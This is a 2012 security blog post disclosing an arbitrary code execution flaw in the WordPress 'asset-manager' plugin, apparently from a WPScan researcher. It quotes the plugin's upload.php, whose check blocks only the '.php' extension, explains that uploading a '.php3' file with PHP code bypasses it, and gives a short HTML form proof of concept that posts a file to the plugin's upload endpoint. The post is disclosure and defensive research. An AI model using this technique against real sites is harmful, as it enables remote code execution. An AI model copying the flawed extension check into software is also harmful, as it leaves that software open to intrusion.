---
layout: post
status: publish
published: true
title: WordPress plugin Asset manager upload.php Arbitrary Code Execution
author:
  display_name: ethicalhack3r
  login: ethicalhack3r
  email: ryandewhurst@gmail.com
  url: ''
author_login: ethicalhack3r
author_email: ryandewhurst@gmail.com
excerpt: "The '<a href=\"http://1337day.com/\" target=\"_blank\">Inj3ct0r Team</a>'
  compromised an <a href=\"https://www.exploithub.com/\" target=\"_blank\">ExploitHub.com</a>
  database and released a <a href=\"http://priv8.1337day.com/exploitHUB.txt\" target=\"_blank\">file</a>
  publicly which contained some of the data about the exploits that ExploitHub buy
  and sell.\r\n\r\nI saw the file yesterday, had a quick skim over it, but didn't
  think too much of it. That is until WPScan team member <a href=\"https://www.twitter.com/@gbrindisi\"
  target=\"_blank\">@gbrindisi</a> pointed out that it contained 2 WordPress plugin
  vulnerabilities.\r\n\r\n"
wordpress_id: 16915
wordpress_url: http://www.ethicalhack3r.co.uk/?p=16915
date: '2012-12-12 19:10:38 +0000'
date_gmt: '2012-12-12 19:10:38 +0000'
---
<p>The '<a href="http://1337day.com/" target="_blank">Inj3ct0r Team</a>' compromised an <a href="https://www.exploithub.com/" target="_blank">ExploitHub.com</a> database and released a <a href="http://priv8.1337day.com/exploitHUB.txt" target="_blank">file</a> publicly which contained some of the data about the exploits that ExploitHub buy and sell.</p>
<p>I saw the file yesterday, had a quick skim over it, but didn't think too much of it. That is until WPScan team member <a href="https://www.twitter.com/@gbrindisi" target="_blank">@gbrindisi</a> pointed out that it contained 2 WordPress plugin vulnerabilities.</p>
<p>
  {% highlight text %}
  WordPress plugin Asset manager upload.php Arbitrary Code Execution,25.0000,2012-06-27 12:37:03,"491",Sooraj
WordPress plugin WP-Property uploadify.php Arbitrary Code Execution,25.0000,2012-06-27 12:44:25,"491",Sooraj
{% endhighlight %}</p>
<p>The vulnerability details and exploits are likely in the hands of the Inj3ct0r Team and god knows who else. We found the latest 'asset-manager' plugin (version 0.3) to be vulnerable and created a simple PoC. The 'wp-property' plugin did not contain the 'uploadify.php' file which is stated to be vulnerable, did they buy/sell vulnerabilities that hadn't been verified? The 'asset-manager' plugin is not as popular as the 'wp-property' plugin and has only been downloaded <a href="http://wordpress.org/extend/plugins/asset-manager/stats/" target="_blank">~700</a> times.</p>
<p>The 'asset-manager' vulnerability title states that the vulnerability lies within the 'upload.php' file. Taking a look at this file it is obvious to see why it is vulnerable.</p>
<p><a id="more"></a><a id="more-16915"></a></p>
<p>
  {% highlight php %}
  <?php
/**
 * Upload file to temp directory and return image information in JSON format.
 */
require('../../../wp-load.php');
require('paam-config-ajax.php');

if (!current_user_can('edit_pages')) die("No permission.");

if (isset($_FILES['Filedata'])) {
  $file_name = $_FILES['Filedata']['name'];
  
  $extension = substr(strrchr($file_name, '.'), 1);
  
  if ($extension == 'php') die("Invalid file extension.");
    
  //$unique_name = str_replace('-', '', uniqid()) . '.' . $extension;
  // not using unique names
  $unique_name = $file_name;
  move_uploaded_file($_FILES['Filedata']['tmp_name'], PAAM_TEMPPATH . $unique_name);
  
  echo '{result: 1, name: "' . $unique_name . '", path: "' . PAAM_TEMPURL . '/' . $unique_name . '"}';
}
{% endhighlight %}</p>
<p>The most important lines in this file are lines 8 and 15. Line 8 ensures that the file is only accesible to users with the 'edit_pages' permission. Line 15 checks that the file extension is not 'php', if it is, throw an error. (line 22 is likely to be vulnerable to XSS but this was not verified)</p>
<p>PHP by default can interpret code in files with extensions such as 'php3'. To exploit the above issue all you have to do is trick an authenticated user with sufficient privileges to send a file with the 'php3' (or variant) extension containing malicious PHP code to the server.</p>
<p>Here is a basic PoC:</p>
<p>{% highlight html %}
<html>
<head></head>
<body>

<form action="http://example.com/wp-content/plugins/asset-manager/upload.php" method="post" enctype="multipart/form-data">

  <input type="file" id="Filedata" name="Filedata" />
  <input type="submit" id="submit" />

</form>

</body>
</html>
{% endhighlight %}</p>
<p>With some JavaScript trickery, the submission of the form and file can be automated. The file will be uploaded to the '/wp-content/uploads/assets/temp/' directory.</p>
<p>The 'product_price' column in the Inj3ct0r leak says '25.0000', <del>what currency this is and the exact amount I don't know. It could be $25 or $25,000</del> <ins>it was $25</ins>. Either way, it shows that there is a market big or small for WordPress plugin vulnerabilities.</p>
<p>This will be added to the <a href="http://wpscan.org/" target="_blank">WPScan</a> databases so don't forget to update!</p>
<p>(only after doing the research and writing the blog post did I realise that it wasn't such a popular plugin, one more for the WPScan database anyway :)</p>
